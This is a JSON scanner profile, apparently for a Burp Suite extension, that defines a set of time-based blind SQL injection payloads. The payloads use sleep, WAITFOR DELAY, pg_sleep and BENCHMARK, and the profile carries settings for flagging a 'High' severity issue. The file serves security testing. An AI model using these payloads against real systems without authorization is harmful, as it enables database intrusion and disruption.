[{"Name":"BlindSQLi-TimeBased","Active":false,"Scanner":1,"Author":"@egarme","Payloads":["\u0027 and sleep 12--","\u0027 and sleep 12","\u0027 and sleep 12 and \u00271\u0027\u003d\u00271","\u0027 and sleep(12) and \u00271\u0027\u003d\u00271","\u0027 and sleep(12)--","\u0027 and sleep(12)",";sleep(12)--","\u0027 SELECT BENCHMARK(1200000,\n\n\n\n\n\n\n\nMD5(\u0027A\u0027));","\u0027 SELECT SLEEP(12); #","\u0027 WAITFOR DELAY \u00270:0:12\u0027--","\u0027 WAITFOR DELAY \u00270:0:12\u0027","\u0027 SELECT pg_sleep(12);"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":[],"Tags":["SQLi"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"8","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"isReplace":false,"Replace1":"","Replace2":"","ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"MatchType":5,"RedirType":0,"MaxRedir":0,"spaceEncode":false,"payloadPosition":2,"sEncode":"","payloadsFile":"","grepsFile":"","IssueName":"BlindSQLi-TimeBased","IssueSeverity":"High","IssueConfidence":"Tentative","IssueDetail":"Blind SQLi Time Based found","RemediationDetail":"","IssueBackground":"","RemediationBackground":""}]